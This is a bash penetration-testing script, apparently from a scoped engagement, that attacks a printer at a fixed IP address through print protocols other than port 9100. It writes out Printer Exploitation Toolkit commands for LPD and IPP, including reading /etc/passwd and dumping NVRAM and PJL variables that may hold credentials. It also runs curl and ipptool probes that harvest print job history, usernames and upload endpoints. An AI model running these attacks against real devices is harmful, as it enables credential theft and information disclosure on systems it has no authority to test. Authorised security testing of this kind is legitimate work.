#!/bin/bash
# Phase 9: Print Protocol Exploitation
# NOTE: PJL/PS on port 9100 is OUT OF SCOPE as a known issue
#       But PJL/PS via OTHER vectors (web UI, IPP, LPD) may be in scope
#       Also test for PRET-style attacks via non-9100 channels

TARGET="13.13.1.112"
OUTDIR="../results/09_print_protocols"
mkdir -p "$OUTDIR"

echo "[*] Phase 9: Print Protocol Attack Surface - $TARGET"
echo "[!] Note: Direct PJL/PS on port 9100 is OUT OF SCOPE"
echo "[!] Testing via alternative vectors only"

###############################################################################
# 9a. PRET (Printer Exploitation Toolkit) via non-9100 channels
###############################################################################
echo "[+] If PRET is installed, use these commands:"
cat > "$OUTDIR/pret_commands.txt" <<'EOF'
# PRET - Printer Exploitation Toolkit
# https://github.com/RUB-NDS/PRET
# DO NOT use on port 9100 (OOS), use via IPP/LPD instead

# PJL mode via LPD (port 515) - if accessible
python3 pret.py -s lpd TARGET pjl

# PostScript mode via LPD
python3 pret.py -s lpd TARGET ps

# PJL via IPP (port 631)
python3 pret.py -s ipp TARGET pjl

# Once connected, useful commands:
# info id          - Device info
# info status      - Printer status
# info config      - Full config dump
# info filesys     - File system info
# info memory      - Memory info
# ls /             - List root directory
# cat /etc/passwd  - Read files (if accessible)
# nvram dump       - NVRAM contents (may contain creds)
# env              - Environment variables
# set              - PJL variables (may include passwords)
EOF

###############################################################################
# 9b. IPP-based print job injection
###############################################################################
echo "[+] Testing IPP print job capabilities..."

# Check what operations IPP supports
if command -v ipptool &>/dev/null; then
  # Get supported operations
  ipptool -tv "ipp://$TARGET/ipp/print" get-printer-attributes.test 2>/dev/null \
    | grep -i "operations-supported" | tee "$OUTDIR/ipp_operations.txt"

  # Check for print job history (may contain doc names = info disclosure)
  ipptool -tv "ipp://$TARGET/ipp/print" get-jobs.test 2>/dev/null \
    | tee "$OUTDIR/ipp_jobs.txt"
fi

###############################################################################
# 9c. Job history and document name disclosure
###############################################################################
echo "[+] Checking for print job history disclosure..."

JOB_PATHS=(
  "/jobs/"
  "/jobs/job_queue.dhtml"
  "/jobs/completed"
  "/jobs/history"
  "/webservices/office/jobservice"
)

for JP in "${JOB_PATHS[@]}"; do
  RESP=$(curl -skL --connect-timeout 5 "https://$TARGET$JP" 2>/dev/null)
  if [[ -n "$RESP" ]] && ! echo "$RESP" | grep -q "404"; then
    echo "$RESP" > "$OUTDIR/jobs_$(echo $JP | tr '/' '_').html"
    # Look for document names, usernames, timestamps
    echo "$RESP" | grep -ioP '(document|filename|user|owner|submitted)[^<]*' \
      | head -20 | tee -a "$OUTDIR/job_info_disclosure.txt"
    echo "  [!] Job history accessible at: https://$TARGET$JP"
  fi
done

###############################################################################
# 9d. PostScript/PDF injection via web upload
###############################################################################
echo "[+] Checking for web-based print submission..."

UPLOAD_PATHS=("/print/" "/print/index.html" "/webglue/content?c=print"
              "/submitjob" "/upload" "/printjob")

for UP in "${UPLOAD_PATHS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 3 \
    "https://$TARGET$UP" 2>/dev/null)
  [[ "$CODE" != "000" && "$CODE" != "404" ]] && \
    echo "  [!] Print submission endpoint: https://$TARGET$UP ($CODE)" \
    | tee -a "$OUTDIR/print_upload_endpoints.txt"
done

echo "[*] Print protocol analysis complete. Review results in $OUTDIR/"
echo ""
echo "=== CRITICAL REMINDER ==="
echo "Port 9100 PJL/PS is OUT OF SCOPE. Only test via web/IPP/LPD vectors."
